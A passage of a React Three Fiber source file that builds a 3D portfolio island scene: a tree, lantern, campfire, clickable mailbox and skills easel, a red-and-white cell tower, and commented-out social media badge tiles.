          <mesh key={i} position={[0, 0.006, dz]}><boxGeometry args={[0.1, 0.002, 0.007]} /><meshStandardMaterial color="#cccccc" roughness={0.5} /></mesh>
        ))}
        <mesh position={[0.08, 0.012, 0]} rotation={[0, 0.3, 0]}><cylinderGeometry args={[0.005, 0.005, 0.14, 6]} /><meshStandardMaterial color="#888880" roughness={0.4} /></mesh>
      </group>

      {/* ── Small desk plant ── */}
      {/* <group position={[0.76, 0.742, 0.60]}>
        <mesh castShadow><cylinderGeometry args={[0.044, 0.052, 0.07, 10]} /><meshStandardMaterial color="#c07040" roughness={0.8} /></mesh>
        {[0,1,2].map(i => (
          <mesh key={i} position={[Math.sin(i*2.09)*0.04, 0.09+i*0.015, Math.cos(i*2.09)*0.04]}>
            <sphereGeometry args={[0.05, 6, 5]} /><meshStandardMaterial color="#d4d0c8" roughness={1.0} flatShading />
          </mesh>
        ))}
      </group> */}

    </group>
  )
}



// ── Tree ──────────────────────────────────────────────────────
function Tree({ position = [1.85,0.28,-1.25] }) {
  const clusters = useMemo(() => [
    [0,1.6,0,0.72],[-0.42,1.38,0.24,0.56],[0.38,1.28,-0.22,0.52],
    [-0.22,1.78,-0.32,0.47],[0.32,1.68,0.34,0.44],[-0.52,1.08,-0.12,0.42],
    [0.12,1.12,0.46,0.4],[0.5,1.5,0.18,0.38],[-0.18,1.22,0.5,0.35],
  ], [])
  return (
    <group position={position}>
      <mesh castShadow><cylinderGeometry args={[0.1,0.15,1.25,10]} /><meshStandardMaterial color={C.wood} roughness={0.92} /></mesh>
      {[0.2,0.5,0.8].map((y,i) => (
        <mesh key={i} position={[0,y,0]}>
          <torusGeometry args={[0.115-y*0.02,0.012,4,12]} />
          <meshStandardMaterial color={C.woodDark} roughness={0.95} />
        </mesh>
      ))}
      <mesh position={[-0.25,0.72,0.1]} rotation={[0.2,0,0.55]} castShadow>
        <cylinderGeometry args={[0.04,0.07,0.72,8]} />
        <meshStandardMaterial color={C.wood} roughness={0.92} />
      </mesh>
      {[0,1,2,3].map(i => {
        const a=(i/4)*Math.PI*2
        return <mesh key={i} position={[Math.cos(a)*0.14,-0.55,Math.sin(a)*0.14]} rotation={[0,a,0.4]}><boxGeometry args={[0.06,0.08,0.22]} /><meshStandardMaterial color={C.woodDark} roughness={0.95} /></mesh>
      })}
      {clusters.map(([x,y,z,r],i) => (
        <mesh key={i} position={[x,y,z]} castShadow>
          <sphereGeometry args={[r,8,6]} />
          <meshStandardMaterial color={i%3===0?C.leaf:i%3===1?C.leafMid:C.island} roughness={1.0} flatShading />
        </mesh>
      ))}
    </group>
  )
}


// ── Lantern ────────────────────────────────────────────────────────────────
function Lantern({ position = [-1.7, 0.28, -0.5] }) {
  return (
    <group position={position}>
      <mesh castShadow>
        <cylinderGeometry args={[0.038, 0.044, 1.18, 10]} />
        <meshStandardMaterial color={C.wall} roughness={0.6} />
      </mesh>
      <mesh position={[0.18, 0.5, 0]} rotation={[0, 0, -0.35]}>
        <cylinderGeometry args={[0.022, 0.022, 0.5, 8]} />
        <meshStandardMaterial color={C.wall} roughness={0.6} />
      </mesh>
      <group position={[0.4, 0.46, 0]}>
        {/* Glass panels */}
        {[0,1,2,3].map(i => (
          <mesh key={i} position={[Math.sin(i*Math.PI/2)*0.105, 0, Math.cos(i*Math.PI/2)*0.105]} rotation={[0, i*Math.PI/2, 0]}>
            <planeGeometry args={[0.19, 0.22]} />
            <meshStandardMaterial color="#ffe0a0" transparent opacity={0.3} emissive="#ffe0a0" emissiveIntensity={0.4} side={THREE.DoubleSide} />
          </mesh>
        ))}
        {/* Frame */}
        <mesh><boxGeometry args={[0.21, 0.26, 0.21]} /><meshStandardMaterial color={C.accent} roughness={0.4} transparent opacity={0.15} /></mesh>
        {/* Top cap */}
        <mesh position={[0, 0.16, 0]}><boxGeometry args={[0.23, 0.06, 0.23]} /><meshStandardMaterial color={C.wallDk} roughness={0.5} /></mesh>
        <mesh position={[0, 0.22, 0]}><coneGeometry args={[0.13, 0.1, 4]} /><meshStandardMaterial color={C.wallDk} roughness={0.5} /></mesh>
        {/* Bulb */}
        <mesh position={[0, -0.02, 0]}><sphereGeometry args={[0.055, 8, 8]} /><meshStandardMaterial color="#ffe8a0" emissive="#ffe8a0" emissiveIntensity={1.8} roughness={0.1} /></mesh>
        <pointLight intensity={2.4} color="#ffe4a0" distance={3.8} decay={2} />
      </group>
    </group>
  )
}

// ── Campfire ───────────────────────────────────────────────────────────────
function Campfire({ position = [0.0, 0.28, 0.95] }) {
  const fireRef = useRef()
  const innerRef = useRef()
  const emberRef = useRef()
  useFrame(({ clock }) => {
    const t = clock.elapsedTime
    if (fireRef.current) { fireRef.current.scale.y = 1 + Math.sin(t*7.3)*0.15; fireRef.current.scale.x = 1 + Math.sin(t*5.8)*0.09 }
    if (innerRef.current) { innerRef.current.scale.y = 1 + Math.sin(t*9.1+1)*0.18; innerRef.current.scale.x = 1 + Math.sin(t*6.7+2)*0.11 }
    if (emberRef.current) emberRef.current.rotation.y = t * 1.5
  })
  return (
    <group position={position}>
      {/* Stone ring */}
      {[0,1,2,3,4,5].map(i => (
        <mesh key={i} position={[Math.cos(i/6*Math.PI*2)*0.2, 0.02, Math.sin(i/6*Math.PI*2)*0.2]}>
          <sphereGeometry args={[0.07, 6, 5]} />
          <meshStandardMaterial color={C.socDk} roughness={0.95} flatShading />
        </mesh>
      ))}
      <mesh rotation={[0,0.5,Math.PI/2]} castShadow><cylinderGeometry args={[0.055,0.055,0.42,8]} /><meshStandardMaterial color={C.wood} roughness={0.95} /></mesh>
      <mesh rotation={[0,-0.5,Math.PI/2]} castShadow><cylinderGeometry args={[0.055,0.055,0.42,8]} /><meshStandardMaterial color={C.woodDk} roughness={0.95} /></mesh>
      <mesh rotation={[Math.PI/2,0.9,0]} castShadow><cylinderGeometry args={[0.045,0.045,0.38,8]} /><meshStandardMaterial color={C.wood} roughness={0.95} /></mesh>
      <mesh position={[0,0.03,0]}><sphereGeometry args={[0.1,8,6]} /><meshStandardMaterial color="#1a0800" roughness={0.9} emissive="#ff4400" emissiveIntensity={0.3} /></mesh>
      <mesh ref={fireRef} position={[0,0.22,0]}><coneGeometry args={[0.12,0.38,8]} /><meshStandardMaterial color={C.fire} emissive={C.fire} emissiveIntensity={1.5} transparent opacity={0.88} roughness={0.1} /></mesh>
      <mesh ref={innerRef} position={[0,0.24,0]}><coneGeometry args={[0.065,0.28,8]} /><meshStandardMaterial color={C.fireYlw} emissive={C.fireYlw} emissiveIntensity={2.5} transparent opacity={0.9} roughness={0.1} /></mesh>
      <mesh position={[0,0.38,0]}><coneGeometry args={[0.025,0.1,6]} /><meshStandardMaterial color="#ffffff" emissive="#ffffff" emissiveIntensity={3} transparent opacity={0.7} roughness={0.1} /></mesh>
      <group ref={emberRef}>
        {[0,1,2].map(i => (
          <mesh key={i} position={[Math.sin(i*2.09)*0.07, 0.08, Math.cos(i*2.09)*0.07]}>
            <sphereGeometry args={[0.012,6,4]} />
            <meshStandardMaterial color="#ff6600" emissive="#ff6600" emissiveIntensity={3} roughness={0.1} />
          </mesh>
        ))}
      </group>
      <pointLight position={[0,0.35,0]} intensity={3.2} color="#ff8800" distance={5} decay={2} />
      <pointLight position={[0,0.1,0]} intensity={1.5} color="#ff4400" distance={2} decay={2} />
    </group>
  )
}



// ── Mailbox ── click → contact ────────────────────────────────
function Mailbox({ onSelect }) {
  return (
    <group
      position={[-2.05,0.28,0.45]}
      onClick={e => { e.stopPropagation(); onSelect('contact') }}
    >
      <mesh position={[0,0.22,0]} castShadow><boxGeometry args={[0.06,0.46,0.06]} /><meshStandardMaterial color={C.wallDark} roughness={0.7} /></mesh>
      <mesh position={[0,0,0]}><boxGeometry args={[0.15,0.04,0.15]} /><meshStandardMaterial color={C.stone} roughness={0.75} /></mesh>
      <mesh position={[0,0.48,0]}><boxGeometry args={[0.24,0.2,0.32]} /><meshStandardMaterial color={C.wall} roughness={0.58} /></mesh>
      <mesh position={[0,0.59,0]}>
        <cylinderGeometry args={[0.12,0.12,0.32,10,1,false,0,Math.PI]} />
        <meshStandardMaterial color={C.accent} roughness={0.55} side={THREE.DoubleSide} />
      </mesh>
      <mesh position={[0.125,0.48,0]}><boxGeometry args={[0.01,0.03,0.14]} /><meshStandardMaterial color={C.dark} /></mesh>
      {/* Flag */}
      <mesh position={[-0.12,0.56,0.14]}><boxGeometry args={[0.015,0.12,0.015]} /><meshStandardMaterial color={C.wallDark} /></mesh>
      <mesh position={[-0.12,0.62,0.14]}><boxGeometry args={[0.015,0.06,0.05]} /><meshStandardMaterial color={C.screenRed} emissive={C.screenRed} emissiveIntensity={0.3} /></mesh>
      <pointLight position={[0,0.55,0]} intensity={0.55} color="#aaddff" distance={2} decay={2} />
    </group>
  )
}

// // ── Shared rounded-square keycap tile ─────────────────────────────────────
// // Matches reference: flat tile lying on ground, rounded corners, dark icon raised on top
// function SocialTile({ position, rotation = [0, 0, 0], url, children }) {
//   const base   = '#d8d4e8'   // soft lavender-cream
//   const face   = '#ccc8dc'   // slightly darker top face
//   const corner = 0.048       // corner sphere radius

//   return (
//     <group
//       position={position}
//       rotation={rotation}
//       onClick={(e) => { e.stopPropagation(); if (url) window.open(url, '_blank') }}
//     >
//       {/* ── MAIN BODY — thick rounded square ── */}
//       <mesh castShadow receiveShadow>
//         <boxGeometry args={[0.32, 0.072, 0.32]} />
//         <meshStandardMaterial color={base} roughness={0.55} />
//       </mesh>

//       {/* ── CORNER CYLINDERS — give the true rounded-square look ── */}
//       {[[-0.138,-0.138],[0.138,-0.138],[-0.138,0.138],[0.138,0.138]].map(([x,z],i) => (
//         <mesh key={i} position={[x, 0, z]} castShadow>
//           <cylinderGeometry args={[corner, corner, 0.072, 16]} />
//           <meshStandardMaterial color={base} roughness={0.55} />
//         </mesh>
//       ))}

//       {/* ── TOP FACE INSET — slightly recessed panel ── */}
//       <mesh position={[0, 0.038, 0]}>
//         <boxGeometry args={[0.26, 0.008, 0.26]} />
//         <meshStandardMaterial color={face} roughness={0.5} />
//       </mesh>
//       {/* top face corner fills */}
//       {[[-0.11,-0.11],[0.11,-0.11],[-0.11,0.11],[0.11,0.11]].map(([x,z],i) => (
//         <mesh key={i} position={[x, 0.038, z]}>
//           <cylinderGeometry args={[0.02, 0.02, 0.008, 10]} />
//           <meshStandardMaterial color={face} roughness={0.5} />
//         </mesh>
//       ))}

//       {/* ── BOTTOM ROUNDED EDGE ── */}
//       {[[-0.138,-0.138],[0.138,-0.138],[-0.138,0.138],[0.138,0.138]].map(([x,z],i) => (
//         <mesh key={`b${i}`} position={[x, -0.036, z]}>
//           <sphereGeometry args={[corner, 10, 10]} />
//           <meshStandardMaterial color={base} roughness={0.55} />
//         </mesh>
//       ))}

//       {/* ── ICON CONTENT (children rendered raised above top face) ── */}
//       <group position={[0, 0.047, 0]}>
//         {children}
//       </group>
//     </group>
//   )
// }

// // ── GitHub Badge ──────────────────────────────────────────────────────────
// function GithubBadge({ position, rotation }) {
//   const ic = '#2a1a10'
//   return (
//     <SocialTile position={position} rotation={rotation} url="https://github.com">
//       {/* Octocat head circle */}
//       <mesh rotation={[Math.PI/2, 0, 0]}>
//         <cylinderGeometry args={[0.072, 0.072, 0.016, 32]} />
//         <meshStandardMaterial color={ic} roughness={0.4} />
//       </mesh>
//       {/* Left ear */}
//       <mesh position={[-0.048, 0, -0.056]} rotation={[Math.PI/2, 0, -0.18]}>
//         <coneGeometry args={[0.022, 0.044, 4]} />
//         <meshStandardMaterial color={ic} roughness={0.4} />
//       </mesh>
//       {/* Right ear */}
//       <mesh position={[0.048, 0, -0.056]} rotation={[Math.PI/2, 0, 0.18]}>
//         <coneGeometry args={[0.022, 0.044, 4]} />
//         <meshStandardMaterial color={ic} roughness={0.4} />
//       </mesh>
//       {/* Body */}
//       <mesh position={[0, 0, 0.068]} rotation={[Math.PI/2, 0, 0]}>
//         <cylinderGeometry args={[0.048, 0.044, 0.016, 22]} />
//         <meshStandardMaterial color={ic} roughness={0.4} />
//       </mesh>
//       {/* Tail arc */}
//       <mesh position={[0, 0, 0.102]} rotation={[Math.PI/2, 0, 0]}>
//         <torusGeometry args={[0.030, 0.010, 8, 24, Math.PI * 1.25]} />
//         <meshStandardMaterial color={ic} roughness={0.4} />
//       </mesh>
//       {/* Tentacle left */}
//       <mesh position={[-0.048, 0, 0.078]} rotation={[Math.PI/2, 0, 0.3]}>
//         <cylinderGeometry args={[0.009, 0.005, 0.052, 6]} />
//         <meshStandardMaterial color={ic} roughness={0.4} />
//       </mesh>
//       {/* Tentacle right */}
//       <mesh position={[0.048, 0, 0.078]} rotation={[Math.PI/2, 0, -0.3]}>
//         <cylinderGeometry args={[0.009, 0.005, 0.052, 6]} />
//         <meshStandardMaterial color={ic} roughness={0.4} />
//       </mesh>
//     </SocialTile>
//   )
// }

// // ── YouTube Badge ─────────────────────────────────────────────────────────
// function YoutubeBadge({ position, rotation }) {
//   const ic = '#2a1a10'
//   return (
//     <SocialTile position={position} rotation={rotation} url="https://youtube.com">
//       {/* Rounded-rect background for play button */}
//       <mesh rotation={[Math.PI/2, 0, 0]}>
//         <boxGeometry args={[0.14, 0.016, 0.10]} />
//         <meshStandardMaterial color={ic} roughness={0.4} />
//       </mesh>
//       {/* Corner rounding for the rect */}
//       {[[-0.058,-0.038],[0.058,-0.038],[-0.058,0.038],[0.058,0.038]].map(([x,z],i) => (
//         <mesh key={i} position={[x,0,z]} rotation={[Math.PI/2,0,0]}>
//           <cylinderGeometry args={[0.018, 0.018, 0.016, 12]} />
//           <meshStandardMaterial color={ic} roughness={0.4} />
//         </mesh>
//       ))}
//       {/* Play triangle */}
//       <mesh position={[0.007, 0, 0]} rotation={[Math.PI/2, 0, Math.PI/2]}>
//         <coneGeometry args={[0.028, 0.044, 3]} />
//         <meshStandardMaterial color="#d8d4e8" roughness={0.3} />
//       </mesh>
//     </SocialTile>
//   )
// }

// // ── X (Twitter) Badge ─────────────────────────────────────────────────────
// function XBadge({ position, rotation }) {
//   const ic = '#2a1a10'
//   return (
//     <SocialTile position={position} rotation={rotation} url="https://x.com">
//       {/* X — two crossing bars */}
//       <mesh rotation={[Math.PI/2, 0, Math.PI/4]}>
//         <boxGeometry args={[0.145, 0.016, 0.026]} />
//         <meshStandardMaterial color={ic} roughness={0.4} />
//       </mesh>
//       <mesh rotation={[Math.PI/2, 0, -Math.PI/4]}>
//         <boxGeometry args={[0.145, 0.016, 0.026]} />
//         <meshStandardMaterial color={ic} roughness={0.4} />
//       </mesh>
//     </SocialTile>
//   )
// }

// // ── Instagram Badge ───────────────────────────────────────────────────────
// function InstagramBadge({ position, rotation }) {
//   const ic = '#2a1a10'
//   return (
//     <SocialTile position={position} rotation={rotation} url="https://instagram.com">
//       {/* Outer rounded square ring — use torus with 4 segments */}
//       <mesh rotation={[Math.PI/2, 0, Math.PI/4]}>
//         <torusGeometry args={[0.062, 0.013, 6, 4]} />
//         <meshStandardMaterial color={ic} roughness={0.4} />
//       </mesh>
//       {/* Inner circle */}
//       <mesh rotation={[Math.PI/2, 0, 0]}>
//         <torusGeometry args={[0.032, 0.011, 8, 18]} />
//         <meshStandardMaterial color={ic} roughness={0.4} />
//       </mesh>
//       {/* Dot top-right */}
//       <mesh position={[0.046, 0, -0.046]}>
//         <sphereGeometry args={[0.013, 8, 8]} />
//         <meshStandardMaterial color={ic} roughness={0.4} />
//       </mesh>
//     </SocialTile>
//   )
// }

// // ── LinkedIn Badge ────────────────────────────────────────────────────────
// function LinkedInBadge({ position, rotation }) {
//   const ic = '#2a1a10'
//   return (
//     <SocialTile position={position} rotation={rotation} url="https://linkedin.com">
//       {/* Left stem */}
//       <mesh position={[-0.044, 0, 0.010]} rotation={[Math.PI/2, 0, 0]}>
//         <boxGeometry args={[0.019, 0.016, 0.085]} />
//         <meshStandardMaterial color={ic} roughness={0.4} />
//       </mesh>
//       {/* Left dot */}
//       <mesh position={[-0.044, 0, -0.052]}>
//         <sphereGeometry args={[0.014, 8, 8]} />
//         <meshStandardMaterial color={ic} roughness={0.4} />
//       </mesh>
//       {/* Right stem */}
//       <mesh position={[0.020, 0, 0.012]} rotation={[Math.PI/2, 0, 0]}>
//         <boxGeometry args={[0.019, 0.016, 0.078]} />
//         <meshStandardMaterial color={ic} roughness={0.4} />
//       </mesh>
//       {/* Arch */}
//       <mesh position={[0.048, 0, -0.018]} rotation={[Math.PI/2, 0, 0]}>
//         <torusGeometry args={[0.026, 0.010, 6, 10, Math.PI]} />
//         <meshStandardMaterial color={ic} roughness={0.4} />
//       </mesh>
//       {/* Right of arch */}
//       <mesh position={[0.076, 0, 0.012]} rotation={[Math.PI/2, 0, 0]}>
//         <boxGeometry args={[0.019, 0.016, 0.078]} />
//         <meshStandardMaterial color={ic} roughness={0.4} />
//       </mesh>
//     </SocialTile>
//   )
// }

// // ── All Social Badges placed on island ────────────────────────────────────
// function SocialBadges({ onSelect }) {
//   return (
//     <group position={[0, 0.295, 0]}>
//       {/* Upper row — near steps/wall like reference image */}
//       <GithubBadge    position={[-0.88, 0, 0.32]} rotation={[0,  0.18, 0]} />
//       <YoutubeBadge   position={[-0.46, 0, 0.28]} rotation={[0, -0.10, 0]} />

//       {/* Lower row — scattered on open ground */}
//       <XBadge         position={[ 0.52, 0, 0.82]} rotation={[0,  0.08, 0]} />
//       <InstagramBadge position={[ 0.90, 0, 1.05]} rotation={[0, -0.22, 0]} />
//       <LinkedInBadge  position={[ 1.26, 0, 0.72]} rotation={[0,  0.14, 0]} />
//     </group>
//   )
// }


// ── Welcome Sign ── click → (removed, monitor is about now) ──
// function WelcomeSign() {
//   return (
//     <group position={[-0.5,0.32,1.55]} rotation={[0,-0.2,0]}>
//       {[-0.4,0.4].map((x,i) => (
//         <mesh key={i} position={[x,-0.22,0]}><boxGeometry args={[0.06,0.26,0.06]} /><meshStandardMaterial color={C.wood} roughness={0.82} /></mesh>
//       ))}
//       <mesh castShadow><boxGeometry args={[1.04,0.32,0.07]} /><meshStandardMaterial color={C.wood} roughness={0.78} /></mesh>
//       <mesh position={[0,0,0.042]}><boxGeometry args={[0.96,0.24,0.01]} /><meshStandardMaterial color={C.dark} roughness={0.3} /></mesh>
//       {[-0.04,0.04].map((dy,i) => (
//         <mesh key={i} position={[0,dy,0.052]}><boxGeometry args={[0.72,0.025,0.005]} /><meshStandardMaterial color={C.terminal} emissive={C.terminal} emissiveIntensity={1.6} /></mesh>
//       ))}
//       {[-0.32,0.32].map((x,i) => (
//         <mesh key={i} position={[x,0,0.052]}><boxGeometry args={[0.04,0.04,0.005]} /><meshStandardMaterial color={C.terminal} emissive={C.terminal} emissiveIntensity={1.2} /></mesh>
//       ))}
//       <pointLight position={[0,0.1,0.3]} intensity={0.35} color={C.terminal} distance={1.2} decay={2} />
//     </group>
//   )
// }

// ── Skills Easel ───────────────────────────────────────────────────────────
function ProjectCanvas({ onSelect }) {
  return (
    <group position={[2.3, 0.28, 0.3]} rotation={[0, -0.55, 0]} onClick={(e) => { e.stopPropagation(); onSelect('skills') }}>
      <mesh position={[-0.12, 0.62, -0.08]} rotation={[0.15,0,0.08]} castShadow><cylinderGeometry args={[0.022,0.022,1.32,8]} /><meshStandardMaterial color={C.wood} roughness={0.8} /></mesh>
      <mesh position={[0.12, 0.62, -0.08]} rotation={[0.15,0,-0.08]} castShadow><cylinderGeometry args={[0.022,0.022,1.32,8]} /><meshStandardMaterial color={C.wood} roughness={0.8} /></mesh>
      <mesh position={[0, 0.56, 0.15]} rotation={[-0.22,0,0]} castShadow><cylinderGeometry args={[0.018,0.018,1.12,8]} /><meshStandardMaterial color={C.woodDk} roughness={0.8} /></mesh>
      <mesh position={[0, 0.92, 0]}><boxGeometry args={[0.74, 0.56, 0.052]} /><meshStandardMaterial color={C.wall} roughness={0.4} /></mesh>
      <mesh position={[0, 0.92, 0.028]}><boxGeometry args={[0.67, 0.49, 0.01]} /><meshStandardMaterial color="#0a1a0a" roughness={0.2} /></mesh>
      {[0, 1, 2].map(i => (
        <mesh key={i} position={[0, 0.97, 0.036]} rotation={[Math.PI/2, 0, (i/3)*Math.PI]}>
          <torusGeometry args={[0.083, 0.015, 8, 24]} />
          <meshStandardMaterial color="#61dafb" emissive="#61dafb" emissiveIntensity={1.2} roughness={0.1} />
        </mesh>
      ))}
      <mesh position={[0, 0.97, 0.044]}><sphereGeometry args={[0.022, 8, 6]} /><meshStandardMaterial color="#61dafb" emissive="#61dafb" emissiveIntensity={2} roughness={0.1} /></mesh>
      {[0.78, 0.72, 0.66].map((y, i) => (
        <mesh key={i} position={[0, y, 0.037]}>
          <boxGeometry args={[0.26-i*0.03, 0.018, 0.002]} />
          <meshStandardMaterial color={C.termGrn} emissive={C.termGrn} emissiveIntensity={0.8} roughness={0.1} />
        </mesh>
      ))}
      <pointLight position={[0, 0.92, 0.25]} intensity={0.6} color="#61dafb" distance={1.4} decay={2} />
    </group>
  )
}



// ── Rocks ─────────────────────────────────────────────────────────────────
function Rocks() {
  return (
    <group>
      {[[-1.8,0.28, 1.8,0.08],
        [ 2.2,0.28,-2.0,0.07],[-0.5,0.28, 2.9,0.1],[ 2.8,0.28,-1.5,0.07]].map(([x,y,z,r],i) => (
        <mesh key={i} position={[x,y,z]} castShadow>
          <sphereGeometry args={[r,6,5]} />
          <meshStandardMaterial color={C.islandBot} roughness={0.95} flatShading />
        </mesh>
      ))}
    </group>
  )
}

// ── Steps ─────────────────────────────────────────────────────────────────
function Steps() {
  return (
    <group position={[0.1, 0.21, 1.1]}>
      {/* Step 1 */}
      <RoundedBox args={[0.38, 0.07, 0.38]} radius={0.02} smoothness={4}
        position={[-0.5, 0.07, 0]} castShadow>
        <meshStandardMaterial color={C.accent} roughness={0.6} />
      </RoundedBox>
      <RoundedBox args={[0.38, 0.07, 0.38]} radius={0.02} smoothness={4}
        position={[0, 0.07, 0]} castShadow>
        <meshStandardMaterial color={C.wallDk} roughness={0.6} />
      </RoundedBox>
      <RoundedBox args={[0.38, 0.07, 0.38]} radius={0.02} smoothness={4}
        position={[0.5, 0.07, 0]} castShadow>
        <meshStandardMaterial color={C.accent} roughness={0.6} />
      </RoundedBox>

      {/* Step 2 — gap */}
      <RoundedBox args={[0.38, 0.07, 0.38]} radius={0.02} smoothness={4}
        position={[-0.5, 0.07, 0.52]} castShadow>
        <meshStandardMaterial color={C.wallDk} roughness={0.6} />
      </RoundedBox>
      <RoundedBox args={[0.38, 0.07, 0.38]} radius={0.02} smoothness={4}
        position={[0, 0.07, 0.52]} castShadow>
        <meshStandardMaterial color={C.accent} roughness={0.6} />
      </RoundedBox>
      <RoundedBox args={[0.38, 0.07, 0.38]} radius={0.02} smoothness={4}
        position={[0.5, 0.07, 0.52]} castShadow>
        <meshStandardMaterial color={C.wallDk} roughness={0.6} />
      </RoundedBox>

      {/* Step 3 — gap */}
      <RoundedBox args={[0.38, 0.07, 0.38]} radius={0.02} smoothness={4}
        position={[-0.5, 0.07, 1.04]} castShadow>
        <meshStandardMaterial color={C.accent} roughness={0.6} />
      </RoundedBox>
      <RoundedBox args={[0.38, 0.07, 0.38]} radius={0.02} smoothness={4}
        position={[0, 0.07, 1.04]} castShadow>
        <meshStandardMaterial color={C.wallDk} roughness={0.6} />
      </RoundedBox>
      <RoundedBox args={[0.38, 0.07, 0.38]} radius={0.02} smoothness={4}
        position={[0.5, 0.07, 1.04]} castShadow>
        <meshStandardMaterial color={C.accent} roughness={0.6} />
      </RoundedBox>
    </group>
  )
}


// ── Plant ─────────────────────────────────────────────────────
function Plant() {
  return (
    <group position={[-2.3,0.28,-0.9]}>
      <mesh castShadow><cylinderGeometry args={[0.1,0.07,0.16,10]} /><meshStandardMaterial color={C.stone} roughness={0.72} /></mesh>
      <mesh position={[0,0.09,0]}><cylinderGeometry args={[0.096,0.096,0.03,10]} /><meshStandardMaterial color="#3a2810" roughness={0.95} /></mesh>
      <mesh position={[0,0.24,0]}><cylinderGeometry args={[0.016,0.016,0.22,6]} /><meshStandardMaterial color="#5a8a2a" roughness={0.85} /></mesh>
      {[[0,0.35,0,0.14],[0.08,0.32,0.06,0.11],[-0.08,0.34,-0.05,0.1],[0.04,0.38,-0.07,0.09]].map(([x,y,z,r],i) => (
        <mesh key={i} position={[x,y,z]}><sphereGeometry args={[r,7,6]} /><meshStandardMaterial color={C.leafMid} roughness={0.9} flatShading /></mesh>
      ))}
    </group>
  )
}


// ── Breathing red warning light ────────────────────────────────
function BreathingLight({ y1, y2 }) {
  const light1Ref = useRef()
  const light2Ref = useRef()
  const matRef    = useRef()
  const pointRef  = useRef()

  useFrame(({ clock }) => {
    const t = clock.elapsedTime
    // Slow breathing pulse — sin wave 0.3 to 1.0
    const pulse = 0.3 + Math.abs(Math.sin(t * 1.2)) * 0.7
    const intensity = 0.5 + Math.abs(Math.sin(t * 1.2)) * 4.5

    if (matRef.current) {
      matRef.current.emissiveIntensity = intensity
    }
    if (pointRef.current) {
      pointRef.current.intensity = pulse * 3.5
    }
  })

  return (
    <group>
      {/* Light sphere 1 */}
      <mesh position={[0, y1, 0]}>
        <sphereGeometry args={[0.032, 10, 10]} />
        <meshStandardMaterial
          ref={matRef}
          color="#ff1100"
          emissive="#ff2200"
          emissiveIntensity={3}
          roughness={0.05}
          transparent
          opacity={0.95}
        />
      </mesh>

      {/* Light sphere 2 — slightly offset phase */}
      <mesh position={[0, y2, 0]}>
        <sphereGeometry args={[0.028, 10, 10]} />
        <meshStandardMaterial
          color="#ff1100"
          emissive="#ff2200"
          emissiveIntensity={3}
          roughness={0.05}
          transparent
          opacity={0.9}
        />
      </mesh>

      {/* Glow halo around light 1 */}
      <mesh position={[0, y1, 0]}>
        <sphereGeometry args={[0.06, 10, 10]} />
        <meshStandardMaterial
          color="#ff2200"
          emissive="#ff2200"
          emissiveIntensity={1}
          roughness={0.1}
          transparent
          opacity={0.18}
        />
      </mesh>

      {/* Animated point light */}
      <pointLight
        ref={pointRef}
        position={[0, y1, 0]}
        intensity={2}
        color="#ff2200"
        distance={3}
        decay={2}
      />
    </group>
  )
}


// ── Cell Tower with Red/White Lattice Base ─────────────────────
function TelephoneTower() {

  // Helper: one lattice section with 4 corner legs + X cross braces
  function LatticeSection({ y, topW, botW, height, white = false }) {
    const color = white ? '#dddddd' : '#cc2200'
    const hw = white ? '#eeeeee' : '#dd3300'
    const corners = [[ 1,  1], [-1,  1], [ 1, -1], [-1, -1]]
    return (
      <group position={[0, y, 0]}>
        {/* Corner legs */}
        {corners.map(([sx, sz], i) => {
          const bx = sx * botW, bz = sz * botW
          const tx = sx * topW, tz = sz * topW
          const mx = (bx + tx) / 2, mz = (bz + tz) / 2
          const dx = tx - bx, dz = tz - bz
          const len = Math.sqrt(dx*dx + height*height + dz*dz)
          const rotZ = Math.atan2(-dx, height)
          const rotX = Math.atan2(dz, height)
          return (
            <mesh key={i} position={[mx, height/2, mz]}
              rotation={[rotX, 0, rotZ]} castShadow>
              <cylinderGeometry args={[0.018, 0.022, len, 6]} />
              <meshStandardMaterial color={color} roughness={0.5} metalness={0.4} />
            </mesh>
          )
        })}
        {/* X cross brace — front face */}
        {[1, -1].map((dir, i) => {
          const x1 = botW, z1 = botW * dir
          const x2 = topW, z2 = topW * dir * -1
          const mx = (x1 + x2) / 2, mz = (z1 + z2) / 2
          const dx = x2 - x1, dz = z2 - z1
          const len = Math.sqrt(dx*dx + height*height + dz*dz)
          return (
            <mesh key={i} position={[mx, height/2, mz]}
              rotation={[Math.atan2(dz, height), 0, Math.atan2(-dx, height)]} castShadow>
              <cylinderGeometry args={[0.012, 0.012, len, 5]} />
              <meshStandardMaterial color={hw} roughness={0.5} metalness={0.3} />
            </mesh>
          )
        })}
        {/* X cross brace — side face */}
        {[1, -1].map((dir, i) => {
          const x1 = botW * dir, z1 = botW
          const x2 = topW * dir * -1, z2 = topW
          const mx = (x1 + x2) / 2, mz = (z1 + z2) / 2
          const dx = x2 - x1, dz = z2 - z1
          const len = Math.sqrt(dx*dx + height*height + dz*dz)
          return (
            <mesh key={i} position={[mx, height/2, mz]}
              rotation={[Math.atan2(dz, height), 0, Math.atan2(-dx, height)]} castShadow>
              <cylinderGeometry args={[0.012, 0.012, len, 5]} />
              <meshStandardMaterial color={hw} roughness={0.5} metalness={0.3} />
            </mesh>
          )
        })}
        {/* Horizontal ring at bottom */}
        <mesh position={[0, 0.01, 0]} rotation={[Math.PI/2, 0, Math.PI/4]}>
          <torusGeometry args={[botW * 1.38, 0.013, 6, 4]} />
          <meshStandardMaterial color={color} roughness={0.5} metalness={0.4} />
        </mesh>
        {/* Horizontal ring at top */}
        <mesh position={[0, height - 0.01, 0]} rotation={[Math.PI/2, 0, Math.PI/4]}>
          <torusGeometry args={[topW * 1.38, 0.013, 6, 4]} />
          <meshStandardMaterial color={color} roughness={0.5} metalness={0.4} />
        </mesh>
      </group>
    )
  }

  return (
    <group position={[-0.5, 1.68, -2.8]}>

      {/* ══ LATTICE BASE — alternating red/white ══ */}
      <LatticeSection y={-1.6}  botW={0.40} topW={0.30} height={0.55} white={false} />
      <LatticeSection y={-1.05} botW={0.30} topW={0.22} height={0.50} white={true}  />
      <LatticeSection y={-0.55} botW={0.22} topW={0.14} height={0.45} white={false} />
      <LatticeSection y={-0.1}  botW={0.14} topW={0.06} height={0.40} white={true}  />

      {/* ══ MAIN SHAFT ══ */}
      <mesh position={[0, 0.8, 0]} castShadow>
        <cylinderGeometry args={[0.03, 0.06, 1.8, 8]} />
        <meshStandardMaterial color="#888899" roughness={0.4} metalness={0.6} />
      </mesh>

      {/* ══ TOP MAST ══ */}
      <mesh position={[0, 1.85, 0]} castShadow>
        <cylinderGeometry args={[0.015, 0.025, 0.7, 6]} />
